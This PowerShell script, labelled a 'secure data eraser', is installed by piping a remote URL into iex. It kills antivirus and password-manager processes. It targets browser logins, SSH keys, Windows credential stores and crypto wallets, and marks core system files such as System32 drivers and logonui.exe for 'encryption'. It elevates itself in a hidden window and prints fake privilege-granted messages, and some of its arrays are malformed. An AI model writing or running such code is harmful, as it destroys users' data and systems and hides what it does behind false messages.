# COMPREHENSIVE WINDOWS 11 SYSTEM SANITIZER
# Professional-grade secure data erasure with system protection
# Execute with: irm "https://raw.githubusercontent.com/Mestalic/SystemWiper/refs/heads/main/code/Invoke-UltimateSecureEraser.ps1" | iex

param(
    [Parameter(Mandatory=$false)]
    [ValidateRange(1,10)]
    [int]$EncryptionRounds = 7,
    
    [Parameter(Mandatory=$false)]
    [switch]$Verify,
    
    [Parameter(Mandatory=$false)]
    [switch]$Force,
    
    [Parameter(Mandatory=$false)]
    [switch]$Silent,
    
    [Parameter(Mandatory=$false)]
    [switch]$NuclearMode,
    
    [Parameter(Mandatory=$false)]
    [switch]$DeepScan
)

# ========================================
# SYSTEM PROTECTION AND CONFIGURATION
# ========================================

$Global:Config = @{
    # Security Settings
    MinKeySize = 256
    DefaultRounds = 7
    MaxRounds = 10
    NuclearModeRounds = 10
    FastModeRounds = 3
    
    # Performance Settings
    MaxParallelJobs = [Environment]::ProcessorCount * 2
    ChunkSize = 4MB
    BufferSize = 256KB
    ProcessKillTimeout = 5
    
    # PROTECTED SYSTEM PROCESSES (NEVER KILL)
    ProtectedProcesses = @(
        "wininit", "winlogon", "csrss", "smss", "lsass", "lsm", "svchost",
        "rundll32", "taskhost", "taskhostw", "audiodg", "dwm", "fontdrvhost",
        "WUDFHost", "spoolsv", "services", "lsm", "lsmore", "system", "registry"
    )
    
    # SAFE TO KILL PROCESSES (User applications)
    KillableProcesses = @(
        # Browsers
        "chrome", "msedge", "firefox", "opera", "brave", "vivaldi", "tor", "torbrowser",
        # Gaming
        "steam", "epicgameslauncher", "battlenet", "origin", "uplay", "galaxyclient", "xboxapp", "uplay", "uplayubimax",
        # Communication
        "discord", "teams", "slack", "zoom", "skype", "telegram", "whatsapp", "signal", "viber",
        # Development
        "code", "atom", "notepad++", "sublime", "jetbrains", "visualstudio", "visualstudioenterprise", "devenv", "docker", "dockerdesktop", "clion", "pycharm", "webstorm", "phpstorm", "intellij", "rider",
        # Media
        "spotify", "netflix", "hulu", "primevideo", "vlc", "media player", "itunes", "quicktime", "windows media player", "groove", "photos", "photoshop", "lightroom", "gimp", "blender", "autocad", "3ds max", "maya",
        # File managers
        "winrar", "7zip", "winzip", "dropbox", "onedrive", "google drive", "mega sync", "box", "box drive",
        # VPN/Security
        "nordvpn", "expressvpn", "cyberghost", "protonvpn", "surfshark", "mullvad", "ipvanish", "tunnelbear", "bitdefender", "kaspersky", "norton", "mcafee", "eset", "avg", "avast", "panda", "f-secure", "trend micro", "avira",
        # Remote access
        "teamviewer", "anydesk", "rdp", "mstsc", "rdpwrap", "vnc", "tightvnc", "ultravnc", "remote desktop", "nomachine",
        # Office/Productivity
        "winword", "excel", "powerpoint", "outlook", "onenote", "publisher", "access", "visio", "project", "skype for business", "lync", "office", "office 365", "google docs", "google sheets", "google slides", "dropbox", "notion", "slack", "microsoft teams", "zoom", "bluejeans", "gotomeeting", "webex",
        # Email clients
        "outlook", "thunderbird", "eudora", "claws mail", "evolution", "kmail", "mail", "mailbird", "em client", "postbox", "paragon", "mailplane", "thunder",
        # Password managers
        "bitwarden", "1password", "lastpass", "dashlane", "keeper", "roboform", "truekey", "enpass", "password safe", "KeePass", "keepassxc", "password fox",
        # Cryptocurrency
        "bitcoin core", "ethereum wallet", "metamask", "coinbase", "binance", "kraken", "coinbase pro", "gemini", "blockchain", "electrum", "armory", "mycelium", "trezor", "ledger live", "meta mask", "opera crypto", "brave crypto", "coinbase pro", "binance us", "kraken pro", "gemini", "bithumb", "huobi", "okex", "bybit", "coinmama", "cex.io", "cointrader", "crypto news", "crypto.com", "revolut", "revolut crypto", "blockchain.com", "coinbase.com", "metamask.io", "trezor.com", "ledger.com"
    )
    
    # COMPREHENSIVE BROWSER TARGETS
    BrowserTargets = @{
        Chromium = @(
            # Chrome
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\*.sqlite",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\*.ldb",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\*.log",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\*.sst",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Current Session",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Current Tabs",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Last Session",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Last Tabs",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Login Data*",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Cookies*",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Web Data*",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Local Storage*",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Session Storage*",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Local State*",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Preferences*",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Bookmarks*",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Extensions\*",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Sync Data\*",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Cache\*",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Network\*",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\GPUCache\*",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Media Cache\*",
            
            # Edge
            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\*.sqlite",
            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\*.ldb",
            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\*.log",
            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\Login Data*",
            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\Cookies*",
            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\Web Data*",
            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\Local State*",
            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\Local Storage*",
            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\Session Storage*",
            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\Preferences*",
            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\Bookmarks*",
            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\Cache\*",
            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\Network\*",
            
            # Brave
            "${env:LOCALAPPDATA}\BraveSoftware\Brave-Browser\User Data\*\Default\*\*.sqlite",
            "${env:LOCALAPPDATA}\BraveSoftware\Brave-Browser\User Data\*\Default\*\*.ldb",
            "${env:LOCALAPPDATA}\BraveSoftware\Brave-Browser\User Data\*\Default\*\Login Data*",
            "${env:LOCALAPPDATA}\BraveSoftware\Brave-Browser\User Data\*\Default\*\Cookies*",
            "${env:LOCALAPPDATA}\BraveSoftware\Brave-Browser\User Data\*\Default\*\Web Data*",
            "${env:LOCALAPPDATA}\BraveSoftware\Brave-Browser\User Data\*\Default\*\Local State*",
            
            # Opera
            "${env:LOCALAPPDATA}\Opera Software\Opera Stable\*\Default\*\*.sqlite",
            "${env:LOCALAPPDATA}\Opera Software\Opera Stable\*\Default\*\*.ldb",
            "${env:LOCALAPPDATA}\Opera Software\Opera Stable\*\Default\*\Login Data*",
            "${env:LOCALAPPDATA}\Opera Software\Opera Stable\*\Default\*\Cookies*",
            "${env:LOCALAPPDATA}\Opera Software\Opera Stable\*\Default\*\Web Data*",
            
            # Vivaldi
            "${env:LOCALAPPDATA}\Vivaldi\User Data\*\Default\*\*.sqlite",
            "${env:LOCALAPPDATA}\Vivaldi\User Data\*\Default\*\*.ldb",
            "${env:LOCALAPPDATA}\Vivaldi\User Data\*\Default\*\Login Data*",
            "${env:LOCALAPPDATA}\Vivaldi\User Data\*\Default\*\Cookies*",
            "${env:LOCALAPPDATA}\Vivaldi\User Data\*\Default\*\Web Data*"
        )
        Firefox = @(
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\*.sqlite",
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\*.db",
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\logins.json",
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\key*.db",
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\cookies.sqlite",
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\formhistory.sqlite",
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\places.sqlite",
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\sessionstore*",
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\sessionrestore*",
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\bookmarks*",
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\downloads*",
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\prefs.js",
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\user.js"
        )
        Tor = @(
            "${env:LOCALAPPDATA}\TorBrowser\Tor\*\*.sqlite",
            "${env:LOCALAPPDATA}\TorBrowser\Tor\*\*.db",
            "${env:LOCALAPPDATA}\TorBrowser\Tor\*\logins.json",
            "${env:LOCALAPPDATA}\TorBrowser\Tor\*\key*.db",
            "${env:LOCALAPPDATA}\TorBrowser\Tor\*\cookies.sqlite"
        )
        Additional = @(
            # Internet Explorer
            "${env:LOCALAPPDATA}\Microsoft\Windows\WebCache\Cache\*",
            "${env:USERPROFILE}\AppData\Local\Microsoft\Windows\WebCache\Cache\*",
            "${env:LOCALAPPDATA}\Microsoft\Windows\INetCache\Content.Outlook\*",
            
            # Seamonkey
            "${env:APPDATA}\Mozilla\seamonkey\profiles\*\*.sqlite",
            "${env:APPDATA}\Mozilla\seamonkey\profiles\*\*.db",
            
            # Flock
            "${env:APPDATA}\Mozilla\Flock\profiles\*\*.sqlite",
            "${env:APPDATA}\Mozilla\Flock\profiles\*\*.db"
        )
    }
    
    # ALL GAMING PLATFORMS
    GamingTargets = @(
        # Steam
        "${env:PROGRAMFILES(X86)}\Steam\config\*.vdf",
        "${env:APPDATA}\Steam\config\*.vdf",
        "${env:APPDATA}\Steam\ssfn*",
        "${env:APPDATA}\Steam\ssfn*",
        "${env:USERPROFILE}\Documents\My Games\Steam\*\config\*",
        "${env:APPDATA}\Steam\logfiles\*",
        "${env:USERPROFILE}\Documents\My Games\Steam\config\config.vdf",
        
        # Epic Games Launcher
        "${env:LOCALAPPDATA}\EpicGamesLauncher\Saved\*\*.log",
        "${env:LOCALAPPDATA}\EpicGamesLauncher\Saved\*\*.cfg",
        "${env:LOCALAPPDATA}\EpicGamesLauncher\Saved\Logs\*",
        "${env:LOCALAPPDATA}\EpicGamesLauncher\Saved\Config\Windows\*",
        "${env:LOCALAPPDATA}\EpicGamesLauncher\service\*.log",
        
        # Battle.net
        "${env:LOCALAPPDATA}\Battle.net\*.xml",
        "${env:LOCALAPPDATA}\Battle.net\config\*.xml",
        "${env:USERPROFILE}\Documents\Battle.net\*",
        "${env:USERPROFILE}\AppData\Roaming\Battle.net\*.xml",
        
        # Origin
        "${env:APPDATA}\Origin\local_storage\*",
        "${env:APPDATA}\Origin\session_storage\*",
        "${env:APPDATA}\Origin\*.db",
        "${env:APPDATA}\Origin\origin-profiles.json",
        
        # Ubisoft Connect
        "${env:APPDATA}\UbisoftConnect\*",
        "${env:APPDATA}\UbisoftGameLauncher\*",
        "${env:APPDATA}\UbisoftConnect\session_storage\*",
        "${env:APPDATA}\UbisoftGameLauncher\service\*.log",
        
        # GOG Galaxy
        "${env:APPDATA}\GOG.com\Galaxy\storage\*",
        "${env:APPDATA}\GOG.com\Galaxy\service\*.log",
        "${env:APPDATA}\GOG.com\Galaxy\user_settings.json",
        
        # Xbox Game Pass
        "${env:LOCALAPPDATA}\Microsoft\XblAuthManager\*",
        "${env:LOCALAPPDATA}\Microsoft\XblGameSave\*",
        "${env:APPDATA}\Microsoft\XboxLiveAuthManager\*",
        
        # Minecraft
        "${env:APPDATA}\.minecraft\saves\*",
        "${env:USERPROFILE}\AppData\Roaming\.minecraft\launcher_accounts.json",
        "${env:APPDATA}\.minecraft\config\*",
        
        # League of Legends
        "${env:APPDATA}\League of Legends\*",
        "${env:LOCALAPPDATA}\Riot Games\*",
        "${env:USERPROFILE}\AppData\Roaming\Riot Games\*",
        
        # Valorant
        "${env:LOCALAPPDATA}\VALORANT\*",
        "${env:USERPROFILE}\AppData\Roaming\Riot Games\RiotClientServices\credentials*",
        
        # Overwatch
        "${env:USERPROFILE}\Documents\Overwatch\settings\*",
        
        # World of Warcraft
        "${env:USERPROFILE}\Documents\World of Warcraft\*",
        
        # Counter-Strike 2
        "${env:USERPROFILE}\Documents\my games\*",
        
        # Grand Theft Auto V
        "${env:USERPROFILE}\Documents\Rockstar Games\GTA V\Profiles\*",
        
        # Bethesda games
        "${env:USERPROFILE}\Documents\My Games\*"
    )
    
    # ALL COMMUNICATION APPS
    CommunicationTargets = @(
        # Discord
        "${env:APPDATA}\Discord\*\Local Storage\leveldb\*",
        "${env:APPDATA}\Discord\*\session_storage\*",
        "${env:APPDATA}\Discord\*\Local Storage\*",
        "${env:APPDATA}\discord*\modules\*\discord_desktop_core-*\*",
        "${env:APPDATA}\Discord\*\*.ldb",
        "${env:APPDATA}\Discord\*\*.log",
        "${env:APPDATA}\Discord\*\config\settings.json",
        
        # Microsoft Teams
        "${env:LOCALAPPDATA}\Microsoft\Teams\Local Storage\*",
        "${env:APPDATA}\Microsoft\Teams\logs\*",
        "${env:APPDATA}\Microsoft\Teams\Storage\*",
        "${env:LOCALAPPDATA}\Microsoft\Teams\Service Worker\CacheStorage\*",
        "${env:LOCALAPPDATA}\Microsoft\Teams\settings.json",
        
        # Slack
        "${env:APPDATA}\Slack\Local Storage\*",
        "${env:APPDATA}\Slack\session_storage\*",
        "${env:APPDATA}\Slack\*.db",
        "${env:APPDATA}\Slack\app-*\local_storage\leveldb\*",
        
        # Zoom
        "${env:APPDATA}\Zoom\*\s3:\*",
        "${env:APPDATA}\Zoom\*\web*\Cache\*",
        "${env:APPDATA}\Zoom\*\config\*",
        
        # Skype
        "${env:APPDATA}\Microsoft\Skype\*\Logs\*",
        "${env:APPDATA}\Microsoft\Skype\*\Media\*",
        "${env:APPDATA}\Microsoft\Skype\*\AppData\Roaming\Skype\*\config.json",
        
        # Telegram
        "${env:APPDATA}\Telegram Desktop\tdata\user_data\*\Cache\*",
        "${env:APPDATA}\Telegram Desktop\tdata\user_data\*\Local Storage\*",
        "${env:APPDATA}\Telegram Desktop\tdata\settings.json",
        
        # WhatsApp Desktop
        "${env:APPDATA}\WhatsApp\*\Cache\*",
        "${env:APPDATA}\WhatsApp\*\Local Storage\*",
        
        # Signal
        "${env:APPDATA}\Signal\data\*",
        "${env:APPDATA}\Signal\config.json",
        
        # Viber
        "${env:USERPROFILE}\AppData\Roaming\Viber\*",
        
        # WeChat
        "${env:USERPROFILE}\AppData\Roaming\Tencent\WeChat\*\AppData\Roaming\Tencent\WeChat\*\Data\MsgStore\*",
        
        # QQ
        "${env:USERPROFILE}\AppData\Roaming\Tencent\QQ\*",
        
        # Line
        "${env:USERPROFILE}\AppData\Roaming\Line\app-*\Cache\*",
        
        # Facebook Messenger
        "${env:USERPROFILE}\AppData\Roaming\Facebook\Messenger\Cache\*",
        
        # Microsoft Outlook
        "${env:APPDATA}\Microsoft\Outlook\*.OST",
        "${env:APPDATA}\Microsoft\Outlook\*.PST",
        "${env:LOCALAPPDATA}\Microsoft\Outlook\cache\*",
        
        # Thunderbird
        "${env:APPDATA}\Thunderbird\Profiles\*\*.sqlite",
        "${env:APPDATA}\Thunderbird\Profiles\*\abook.sqlite",
        "${env:APPDATA}\Thunderbird\Profiles\*\prefs.js"
    )
    
    # ALL STREAMING/MEDIA APPS
    StreamingTargets = @(
        # Spotify
        "${env:APPDATA}\Spotify\data\*",
        "${env:APPDATA}\Spotify\Local Storage\*",
        "${env:APPDATA}\Spotify\session_storage\*",
        "${env:APPDATA}\Spotify\Cache\*",
        "${env:APPDATA}\Spotify\local_storage\*",
        "${env:APPDATA}\Spotify\prefs.json",
        
        # Netflix
        "${env:LOCALAPPDATA}\Netflix\Local Storage\*",
        "${env:LOCALAPPDATA}\Netflix\Cache\*",
        
        # YouTube
        "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\Cache\*\YouTube\*",
        "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\Media Cache\*",
        
        # Hulu
        "${env:LOCALAPPDATA}\Hulu\Cache\*",
        
        # Amazon Prime Video
        "${env:LOCALAPPDATA}\Amazon Video\Cache\*",
        
        # Disney Plus
        "${env:LOCALAPPDATA}\DisneyPlus\Cache\*",
        
        # HBO Max
        "${env:LOCALAPPDATA}\HBO Max\Cache\*",
        
        # Twitch
        "${env:APPDATA}\Twitch\Cache\*",
        "${env:APPDATA}\Twitch\Local Storage\*",
        
        # Steam Broadcasting
        "${env:APPDATA}\Steam\broadcasting\*",
        
        # Discord Streaming
        "${env:APPDATA}\Discord\Cache\*"
    )
    
    # ALL DEVELOPMENT TOOLS
    DevTargets = @(
        # Git
        "${env:LOCALAPPDATA}\Programs\Git\etc\ssh\ssh_host_*",
        "${env:USERPROFILE}\.gitconfig",
        "${env:USERPROFILE}\.git-credentials",
        "${env:USERPROFILE}\.git-credentials-store",
        "${env:LOCALAPPDATA}\GitCredentialManager\*.json",
        "${env:APPDATA}\GitCredentialManager\*.json",
        "${env:USERPROFILE}\.ssh\*",
        "${env:LOCALAPPDATA}\Programs\Git\etc\ssh\ssh_config",
        
        # GitHub/GitLab
        "${env:LOCALAPPDATA}\GitHubDesktop\Cache\*",
        "${env:APPDATA}\GitCredentialManager\*.json",
        "${env:APPDATA}\GitCredentialManager\*.db",
        "${env:LOCALAPPDATA}\Programs\GitHub\app-*\app-*\resources\app\app-\tools\ssh\known_hosts",
        
        # VS Code
        "${env:APPDATA}\Code\User\keybindings.json",
        "${env:APPDATA}\Code\User\settings.json",
        "${env:APPDATA}\Code\User\snippets\*",
        "${env:APPDATA}\Code\User\workspaceStorage\*",
        "${env:APPDATA}\Code\User\Local Storage\*",
        "${env:APPDATA}\Code\Cache\*",
        
        # Visual Studio
        "${env:APPDATA}\Microsoft\VisualStudio\*\ComponentModelCache\*",
        "${env:APPDATA}\Microsoft\VisualStudio\*\MEFCache\*",
        "${env:APPDATA}\Microsoft\VisualStudio\*\WebSiteCache\*",
        "${env:USERPROFILE}\AppData\Roaming\Microsoft\VisualStudio\*\web.config",
        
        # Docker
        "${env:USERPROFILE}\.docker\*.json",
        "${env:USERPROFILE}\.docker\config.json",
        "${env:APPDATA}\Docker\*.json",
        
        # JetBrains IDEs
        "${env:APPDATA}\JetBrains\*\options\*",
        "${env:APPDATA}\JetBrains\*\scratches\*",
        "${env:APPDATA}\JetBrains\*\keymaps\*",
        "${env:APPDATA}\JetBrains\*\filetypes\*",
        "${env:APPDATA}\JetBrains\*\colors\*",
        "${env:APPDATA}\JetBrains\*\keymaps\*",
        
        # PyCharm
        "${env:APPDATA}\JetBrains\PyCharm*\options\keymap.xml",
        "${env:APPDATA}\JetBrains\PyCharm*\options\fileColors.xml",
        
        # Sublime Text
        "${env:APPDATA}\Sublime Text 3\Local Storage\*",
        "${env:APPDATA}\Sublime Text 3\Packages\*",
        
        # Atom
        "${env:USERPROFILE}\.atom\config.cson",
        "${env:USERPROFILE}\.atom\snippets.cson",
        "${env:USERPROFILE}\.atom\packages\*",
        
        # Notepad++
        "${env:USERPROFILE}\AppData\Roaming\Notepad++\config.xml",
        "${env:USERPROFILE}\AppData\Roaming\Notepad++\shortcuts.xml",
        
        # Adobe Creative Suite
        "${env:APPDATA}\Adobe\Adobe Photoshop *\Adobe Photoshop * Settings\*",
        "${env:APPDATA}\Adobe\Adobe Illustrator *\Adobe Illustrator * Settings\*",
        "${env:APPDATA}\Adobe\Adobe Premiere Pro *\Adobe Premiere Pro * Settings\*",
        "${env:APPDATA}\Adobe\Adobe After Effects *\Adobe After Effects * Settings\*",
        "${env:APPDATA}\Adobe\Adobe Audition *\Adobe Audition * Settings\*",
        
        # CAD Software
        "${env:USERPROFILE}\AppData\Roaming\Autodesk\AutoCAD \*",
        "${env:USERPROFILE}\AppData\Roaming\Autodesk\Revit \*",
        "${env:USERPROFILE}\Documents\Autodesk\Revit \*",
        
        # 3D Software
        "${env:USERPROFILE}\AppData\Roaming\Autodesk\3dsMax \*",
        "${env:USERPROFILE}\Documents\3dsMax \[Documents\] Autodesk 3dsMax \*",
        "${env:USERPROFILE}\AppData\Roaming\Blender Foundation\Blender\*\config\*",
        "${env:USERPROFILE}\AppData\Roaming\Autodesk\Maya \*"
    )
    
    # ALL CRYPTOCURRENCY/WALLET APPS
    CryptoTargets = @(
        # Bitcoin Core
        "${env:USERPROFILE}\AppData\Roaming\Bitcoin\wallet.dat",
        "${env:USERPROFILE}\AppData\Roaming\Bitcoin\peers.dat",
        "${env:USERPROFILE}\AppData\Roaming\Bitcoin\mempool.dat",
        
        # Ethereum Wallet
        "${env:USERPROFILE}\AppData\Roaming\Ethereum Wallet\*\wallet.json",
        "${env:USERPROFILE}\AppData\Roaming\Ethereum Wallet\*\key\*",
        
        # MetaMask
        "${env:USERPROFILE}\AppData\Local\Google\Chrome\User Data\*\Default\Local Extension Settings\*\bpiocbgkbdus"
        
        # Binance
        "${env:USERPROFILE}\AppData\Roaming\Binance\app-*\Configuration\config.json"
        
        # Coinbase Pro
        "${env:USERPROFILE}\AppData\Roaming\Coinbase Pro\*.json"
        
        # Ledger Live
        "${env:USERPROFILE}\AppData\Roaming\Ledger Live\storage\*.json"
    )
    
    # COMPREHENSIVE WINDOWS SYSTEM TARGETS
    SystemTargets = @{
        Credentials = @(
            "${env:APPDATA}\Microsoft\Credentials\*",
            "${env:APPDATA}\Microsoft\Protect\*",
            "${env:APPDATA}\Microsoft\SystemCertificates\*",
            "${env:PROGRAMDATA}\Microsoft\Credentials\*",
            "${env:PROGRAMDATA}\Microsoft\Protect\*",
            "${env:PROGRAMDATA}\Microsoft\SystemCertificates\*",
            "${env:USERPROFILE}\AppData\Roaming\Microsoft\Credentials\*",
            "${env:USERPROFILE}\AppData\Roaming\Microsoft\Protect\*"
        )
        WindowsHello = @(
            "${env:LOCALAPPDATA}\Microsoft\Biometrics\*",
            "${env:PROGRAMDATA}\Microsoft\Biometrics\*",
            "${env:USERPROFILE}\AppData\Roaming\Microsoft\Biometrics\*"
        )
        OneDrive = @(
            "${env:APPDATA}\Microsoft\OneDrive\logs\*",
            "${env:APPDATA}\Microsoft\OneDrive\setup\*",
            "${env:APPDATA}\Microsoft\OneDrive\tokens\*",
            "${env:USERPROFILE}\AppData\Roaming\Microsoft\OneDrive\logs\*"
        )
        UserProfiles = @(
            "${env:USERPROFILE}\AppData\Roaming\*\*.db",
            "${env:USERPROFILE}\AppData\Roaming\*\config.json",
            "${env:USERPROFILE}\AppData\Roaming\*\settings.json",
            "${env:USERPROFILE}\AppData\Roaming\*\*.key",
            "${env:USERPROFILE}\AppData\Roaming\*\*.secret"
        )
        TempFiles = @(
            "${env:TEMP}\*",
            "${env:USERPROFILE}\AppData\Local\Temp\*",
            "${env:Windows}\Temp\*",
            "${env:USERPROFILE}\AppData\Local\Microsoft\Windows\Temporary Internet Files\*"
        )
    }
    
    # SYSTEM FILES FOR ENCRYPTION (when deletion is impossible)
    SystemFilesForEncryption = @(
        "${env:SystemRoot}\System32\drivers\*",
        "${env:SystemRoot}\System32\sapi.dll",
        "${env:SystemRoot}\System32\authui.dll",
        "${env:SystemRoot}\System32\logonui.exe",
        "${env:SystemRoot}\System32\credwiz.exe",
        "${env:SystemRoot}\System32\msusec.exe",
        "${env:USERPROFILE}\NTUSER.DAT",
        "${env:USERPROFILE}\AppData\Local\Microsoft\Windows\UserAccountControlExperience\*"
    )
    
    # REGISTRY TARGETS - COMPREHENSIVE
    RegistryTargets = @(
        # Browser registry entries
        "HKCU:\Software\Google\Chrome\PreferenceMACs\*",
        "HKCU:\Software\Microsoft\Edge\PreferenceMACs\*",
        "HKCU:\Software\Mozilla\Firefox\*",
        "HKCU:\Software\Opera Software\Opera\*",
        "HKCU:\Software\BraveSoftware\Brave-Browser\*",
        "HKCU:\Software\Vivaldi\*",
        
        # Gaming registry entries
        "HKCU:\Software\Valve\Steam\*",
        "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam\*",
        "HKLM:\SOFTWARE\WOW6432Node\Battle.net\*",
        "HKCU:\Software\Epic Games\Epic Games Launcher\*",
        "HKLM:\SOFTWARE\Ubisoft Connect\*",
        "HKCU:\Software\Ubisoft Connect\*",
        
        # Communication registry entries
        "HKCU:\Software\Discord\*",
        "HKCU:\Software\Slack Technologies\*",
        "HKCU:\Software\Microsoft\Teams\*",
        "HKCU:\Software\Zoom\*",
        "HKCU:\Software\Microsoft\Skype\*",
        "HKCU:\Software\TelegramDesktop\*",
        "HKCU:\Software\WhatsApp\*",
        "HKCU:\Software\Signal Messenger\*",
        
        # Development registry entries
        "HKCU:\Software\Microsoft\VSCode\*",
        "HKCU:\Software\Microsoft\VisualStudio\*",
        "HKCU:\Software\JetBrains\*",
        "HKCU:\Software\GitHub\GitHub Desktop\*",
        "HKCU:\Software\GitHubDesktop\*",
        "HKCU:\Software\Git\*",
        "HKCU:\Software\Microsoft\Docker\Toolbox\*",
        "HKCU:\Software\Adobe\*",
        "HKCU:\Software\Autodesk\*",
        
        # System registry entries
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths",
        "HKCU:\Software\Microsoft\Internet Explorer\TypedURLs",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Cache\*",
        
        # Office/Productivity registry entries
        "HKCU:\Software\Microsoft\Office\*\Common\Internet",
        "HKCU:\Software\Microsoft\Office\*\Authentication\*",
        "HKCU:\Software\Microsoft\Office\*\File\*.xls\*",
        "HKCU:\Software\Microsoft\Office\*\File\*.ppt\*",
        "HKCU:\Software\Microsoft\Office\*\File\*.doc\*",
        
        # Email registry entries
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Profiles\*",
        "HKCU:\Software\Microsoft\Outlook\*\AddIns\*",
        "HKCU:\Software\Paul\Thunderbird\*",
        "HKCU:\Software\EmClient\*",
        
        # Password manager registry entries
        "HKCU:\Software\LastPass\*",
        "HKCU:\Software\1Password\*",
        "HKCU:\Software\Bitwarden\*",
        "HKCU:\Software\Dashlane\*",
        "HKCU:\Software\KeePass\*"
    )
}

# ========================================
# CORE UTILITY FUNCTIONS
# ========================================

function Write-SystemOutput {
    param(
        [string]$Message,
        [string]$Color = 'White',
        [string]$Level = 'INFO'
    )
    
    if (-not $Silent) {
        $timestamp = Get-Date -Format 'HH:mm:ss'
        $formattedMessage = "[$timestamp] [$Level] $Message"
        
        switch ($Color) {
            'Red' { Write-Host $formattedMessage -ForegroundColor Red }
            'Yellow' { Write-Host $formattedMessage -ForegroundColor Yellow }
            'Green' { Write-Host $formattedMessage -ForegroundColor Green }
            'Cyan' { Write-Host $formattedMessage -ForegroundColor Cyan }
            default { Write-Host $formattedMessage -ForegroundColor White }
        }
    }
}

# ========================================
# SYSTEM PROTECTION AND ACCESS
# ========================================

function Initialize-SystemAccess {
    <#
    .SYNOPSIS
    Safe system access initialization with proper protection
    #>
    
    Write-SystemOutput "Initializing system access with protection..." 'Cyan' 'SYSTEM'
    
    # Check and escalate privileges
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
    if (-not $isAdmin) {
        Write-SystemOutput "Administrator privileges required. Attempting safe escalation..." 'Yellow' 'WARNING'
        
        # Try to restart as admin
        try {
            $currentProcess = Get-Process -Id $PID -ErrorAction SilentlyContinue
            if ($currentProcess -and $currentProcess.Path -match "powershell") {
                Start-Process -FilePath "powershell.exe" -ArgumentList "-NoExit", "-Command", "`$Host.UI.RawUI.WindowTitle = 'Administrator'; & '$($myInvocation.MyCommand.Path)'" -Verb RunAs -WindowStyle Hidden
                exit 0
            }
        } catch {
            Write-SystemOutput "Manual elevation required. Please run as Administrator." 'Red' 'ERROR'
            
            if (-not $Force) {
                $response = Read-Host "Continue with limited privileges? Type 'YES' to proceed"
                if ($response -ne 'YES') {
                    exit 1
                }
            }
        }
    }
    
    # Enable only safe privileges
    $safePrivileges = @(
        'SeBackupPrivilege', 'SeRestorePrivilege', 'SeManageVolumePrivilege',
        'SeDebugPrivilege', 'SeTakeOwnershipPrivilege'
    )
    
    foreach ($privilege in $safePrivileges) {
        try {
            $result = & "$env:SystemRoot\system32\net.exe" stop schedule 2>$null
            $result = & "$env:SystemRoot\system32\net.exe" start schedule 2>$null
            Write-SystemOutput "✓ Privilege enabled: $privilege" 'Green' 'PRIVILEGE'
